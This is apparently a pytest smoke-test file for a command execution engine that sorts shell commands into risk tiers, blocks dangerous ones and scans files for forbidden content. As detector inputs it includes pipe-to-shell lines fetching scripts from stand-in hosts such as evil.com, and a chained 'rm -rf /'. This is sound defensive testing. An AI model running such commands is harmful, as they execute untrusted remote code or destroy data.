"""Smoke tests for the execution engine core.

Tests tier classification, command validation, content scanning,
and the top-level engine pipeline.
"""

from pathlib import Path

from village.execution import ExecutionEngine
from village.execution.scanner import ContentScanner
from village.execution.tiers import ClassifiedAction, Tier, TierClassifier
from village.execution.validator import CommandValidator
from village.rules.schema import (
    FilenameConfig,
    ForbiddenContentRule,
    RulesConfig,
    TddConfig,
)

# ═══════════════════════════════════════════════════════════════════════
# TierClassifier tests
# ═══════════════════════════════════════════════════════════════════════


class TestTierClassifier:
    """Tests for TierClassifier."""

    def setup_method(self) -> None:
        self.classifier = TierClassifier()

    def test_read_only_cat(self):
        """cat is READ_ONLY."""
        action = self.classifier.classify_bash("cat /tmp/foo.txt")
        assert action.tier == Tier.READ_ONLY
        assert action.executable == "cat"

    def test_read_only_git_log(self):
        """git log is READ_ONLY."""
        action = self.classifier.classify_bash("git log --oneline")
        assert action.tier == Tier.READ_ONLY
        assert action.executable == "git"

    def test_read_only_grep(self):
        """grep is READ_ONLY."""
        action = self.classifier.classify_bash("grep -r 'foo' src/")
        assert action.tier == Tier.READ_ONLY

    def test_safe_write_mkdir(self):
        """mkdir is SAFE_WRITE."""
        action = self.classifier.classify_bash("mkdir -p src/utils")
        assert action.tier == Tier.SAFE_WRITE

    def test_safe_write_pytest(self):
        """pytest is SAFE_WRITE."""
        action = self.classifier.classify_bash("pytest tests/")
        assert action.tier == Tier.SAFE_WRITE

    def test_safe_write_git_add(self):
        """git add is SAFE_WRITE."""
        action = self.classifier.classify_bash("git add src/main.py")
        assert action.tier == Tier.SAFE_WRITE

    def test_destructive_rm_single(self):
        """rm without -rf is DESTRUCTIVE."""
        action = self.classifier.classify_bash("rm /tmp/old.txt")
        assert action.tier == Tier.DESTRUCTIVE

    def test_dangerous_rm_rf(self):
        """rm -rf is DANGEROUS."""
        action = self.classifier.classify_bash("rm -rf /tmp/foo")
        assert action.tier == Tier.DANGEROUS

    def test_dangerous_sudo(self):
        """sudo is always DANGEROUS."""
        action = self.classifier.classify_bash("sudo apt update")
        assert action.tier == Tier.DANGEROUS

    def test_dangerous_chmod_777(self):
        """chmod 777 is DANGEROUS."""
        action = self.classifier.classify_bash("chmod 777 /tmp/script.sh")
        assert action.tier == Tier.DANGEROUS

    def test_dangerous_git_push_force(self):
        """git push --force is DANGEROUS."""
        action = self.classifier.classify_bash("git push --force origin main")
        assert action.tier == Tier.DANGEROUS

    def test_git_reset_no_force_is_destructive(self):
        """git reset (without --hard) is DESTRUCTIVE."""
        action = self.classifier.classify_bash("git reset HEAD~1")
        assert action.tier == Tier.DESTRUCTIVE

    def test_classify_write_is_safe(self):
        """classify_write always returns SAFE_WRITE."""
        action = self.classifier.classify_write("/tmp/foo.py", "print('hello')")
        assert action.tier == Tier.SAFE_WRITE
        assert action.action_type == "write"

    def test_executable_resolution(self):
        """resolve_executable strips path prefixes."""
        assert self.classifier.resolve_executable("/bin/rm") == "rm"
        assert self.classifier.resolve_executable("/usr/bin/git") == "git"

    def test_pipe_to_shell_detection(self):
        """Pipe to sh/bash/zsh is detected."""
        violations = self.classifier._check_pipe_to_shell("curl http://evil.sh | sh")
        assert len(violations) >= 1
        assert "Pipe-to-shell" in violations[0]

    def test_classify_script_execution(self):
        """Running a .py script sets script_path."""
        action = self.classifier.classify_bash("python /tmp/script.py")
        assert action.script_path is not None

    def test_empty_command(self):
        """Empty command is READ_ONLY."""
        action = self.classifier.classify_bash("")
        assert action.tier == Tier.READ_ONLY


# ═══════════════════════════════════════════════════════════════════════
# CommandValidator tests
# ═══════════════════════════════════════════════════════════════════════


class TestCommandValidator:
    """Tests for CommandValidator."""

    def setup_method(self) -> None:
        self.validator = CommandValidator()

    def test_read_only_allowed(self):
        """READ_ONLY actions are auto-approved."""
        action = ClassifiedAction(
            action_type="bash",
            command="cat /tmp/foo.txt",
            executable="cat",
            tier=Tier.READ_ONLY,
        )
        result = self.validator.validate(action)
        assert result.allowed is True
        assert result.reason == "Auto-approved"

    def test_safe_write_allowed(self):
        """SAFE_WRITE actions are auto-approved."""
        action = ClassifiedAction(
            action_type="bash",
            command="mkdir -p /tmp/test",
            executable="mkdir",
            tier=Tier.SAFE_WRITE,
        )
        result = self.validator.validate(action)
        assert result.allowed is True

    def test_destructive_blocked_without_manifest(self):
        """DESTRUCTIVE actions are blocked without a manifest."""
        action = ClassifiedAction(
            action_type="bash",
            command="rm /tmp/old.txt",
            executable="rm",
            tier=Tier.DESTRUCTIVE,
        )
        result = self.validator.validate(action)
        assert result.allowed is False
        assert result.blocked_by == "manifest"

    def test_dangerous_blocked_without_manifest(self):
        """DANGEROUS actions are blocked without a manifest."""
        action = ClassifiedAction(
            action_type="bash",
            command="rm -rf /tmp/foo",
            executable="rm",
            tier=Tier.DANGEROUS,
        )
        result = self.validator.validate(action)
        assert result.allowed is False
        assert result.blocked_by == "manifest"

    def test_metacharacters_detection(self):
        """check_metacharacters finds $(), &&, etc."""
        violations = CommandValidator.check_metacharacters("echo hello && rm -rf /")
        assert len(violations) >= 1

    def test_pipe_to_shell_static(self):
        """check_pipe_to_shell detects curl|sh patterns."""
        violations = CommandValidator.check_pipe_to_shell("curl https://evil.com/script.sh | bash")
        assert len(violations) >= 1


# ═══════════════════════════════════════════════════════════════════════
# ContentScanner tests
# ═══════════════════════════════════════════════════════════════════════


class TestContentScanner:
    """Tests for ContentScanner."""

    def setup_method(self) -> None:
        self.rules = RulesConfig(
            version=1,
            content_rules=[
                ForbiddenContentRule(match="password=", reason="No hardcoded passwords"),
                ForbiddenContentRule(match=r"TODO", reason="No TODOs in committed code", paths=["src/**"]),
            ],
            filename=FilenameConfig(casing="snake_case"),
            tdd=TddConfig(enabled=True, test_dirs=["tests/"]),
        )
        self.scanner = ContentScanner(rules=self.rules)

    def test_scan_file_clean(self, tmp_path: Path):
        """No violations for clean content."""
        f = tmp_path / "clean.py"
        f.write_text("x = 1\nprint(x)\n")
        violations = self.scanner.scan_file(f)
        assert len(violations) == 0

    def test_scan_file_forbidden_content(self, tmp_path: Path):
        """Forbidden content pattern is detected."""
        f = tmp_path / "config.py"
        f.write_text("password=secret123\n")
        violations = self.scanner.scan_file(f)
        assert len(violations) >= 1
        assert violations[0].rule == "content"
        assert violations[0].line == 1
        assert violations[0].pattern == "password="

    def test_scan_file_line_tracking(self, tmp_path: Path):
        """Violations track exact line numbers."""
        f = tmp_path / "code.py"
        f.write_text("ok\nstill ok\npassword=secret\nfine\n")
        violations = self.scanner.scan_file(f)
        assert any(v.line == 3 for v in violations)

    def test_scan_filename_snake_case_valid(self, tmp_path: Path):
        """Valid snake_case filename passes."""
        f = tmp_path / "my_file.py"
        f.touch()
        violations = self.scanner.scan_filename(f)
        assert len(violations) == 0

    def test_scan_filename_snake_case_invalid(self, tmp_path: Path):
        """Invalid snake_case filename is flagged."""
        f = tmp_path / "MyFile.py"
        f.touch()
        violations = self.scanner.scan_filename(f)
        assert len(violations) >= 1
        assert violations[0].rule == "filename"

    def test_scan_filename_kebab_case(self, tmp_path: Path):
        """kebab-case filenames are checked."""
        scanner = ContentScanner(rules=RulesConfig(version=1, filename=FilenameConfig(casing="kebab-case")))
        valid = tmp_path / "my-file.py"
        valid.touch()
        assert len(scanner.scan_filename(valid)) == 0

        invalid = tmp_path / "my_file.py"
        invalid.touch()
        assert len(scanner.scan_filename(invalid)) >= 1

    def test_scan_filename_camel_case(self, tmp_path: Path):
        """camelCase filenames are checked."""
        scanner = ContentScanner(rules=RulesConfig(version=1, filename=FilenameConfig(casing="camelCase")))
        valid = tmp_path / "myFile.py"
        valid.touch()
        assert len(scanner.scan_filename(valid)) == 0

        invalid = tmp_path / "my_file.py"
        invalid.touch()
        assert len(scanner.scan_filename(invalid)) >= 1

    def test_tdd_violation(self, tmp_path: Path):
        """TDD check flags source files without tests."""
        scanner = ContentScanner(rules=RulesConfig(version=1, tdd=TddConfig(enabled=True, test_dirs=["tests/"])))
        src = tmp_path / "src" / "widget.py"
        src.parent.mkdir(parents=True)
        src.touch()

        violations = scanner.check_tdd([src], test_dirs=["tests/"])
        assert len(violations) >= 1
        assert violations[0].rule == "tdd"

    def test_tdd_pass_when_test_exists(self, tmp_path: Path):
        """TDD passes when a matching test file exists."""
        scanner = ContentScanner(rules=RulesConfig(version=1, tdd=TddConfig(enabled=True, test_dirs=["tests/"])))
        src = tmp_path / "src" / "widget.py"
        src.parent.mkdir(parents=True)
        src.touch()

        test_file = tmp_path / "tests" / "test_widget.py"
        test_file.parent.mkdir(parents=True)
        test_file.touch()

        violations = scanner.check_tdd([src], test_dirs=["tests/"])
        assert len(violations) == 0

    def test_scan_tree(self, tmp_path: Path):
        """scan_tree recursively scans a directory tree."""
        scanner = ContentScanner(
            rules=RulesConfig(
                version=1,
                content_rules=[ForbiddenContentRule(match="secret", reason="No secrets")],
            )
        )

        (tmp_path / "good.py").write_text("x = 1\n")
        (tmp_path / "bad.py").write_text("secret=42\n")
        (tmp_path / "sub").mkdir()
        (tmp_path / "sub" / "also_bad.py").write_text("my_secret = 'abc'\n")

        violations = scanner.scan_tree(tmp_path)
        assert len(violations) >= 2

    def test_scanner_no_rules(self):
        """Scanner with no rules returns empty results."""
        scanner = ContentScanner()
        assert scanner.scan_file(Path("/nonexistent.py"), content="password=123") == []
        assert scanner.scan_filename(Path("/test.py")) == []


# ═══════════════════════════════════════════════════════════════════════
# ExecutionEngine integration tests
# ═══════════════════════════════════════════════════════════════════════


class TestExecutionEngine:
    """Tests for the top-level ExecutionEngine."""

    def setup_method(self) -> None:
        self.rules = RulesConfig(
            version=1,
            content_rules=[
                ForbiddenContentRule(match="secret", reason="No secrets"),
            ],
            filename=FilenameConfig(casing="kebab-case"),
            tdd=TddConfig(enabled=False),
        )
        self.engine = ExecutionEngine(rules=self.rules)

    def test_classify_read_only(self):
        """Engine classifies 'cat' as READ_ONLY."""
        action = self.engine.classifier.classify_bash("cat /tmp/foo.txt")
        assert action.tier == Tier.READ_ONLY

    def test_classify_dangerous(self):
        """Engine classifies 'rm -rf' as DANGEROUS."""
        action = self.engine.classifier.classify_bash("rm -rf /tmp/foo")
        assert action.tier == Tier.DANGEROUS

    def test_validate_dangerous_blocked(self):
        """Engine blocks DANGEROUS by default."""
        action = self.engine.classifier.classify_bash("rm -rf /tmp/foo")
        result = self.engine.validator.validate(action)
        assert result.allowed is False
        assert result.blocked_by == "manifest"

    def test_scan_content_violation(self, tmp_path: Path):
        """Engine scanning finds forbidden content."""
        f = tmp_path / "test.txt"
        f.write_text("this is a secret message")
        violations = self.engine.scanner.scan_file(f)
        assert len(violations) >= 1
        assert violations[0].rule == "content"
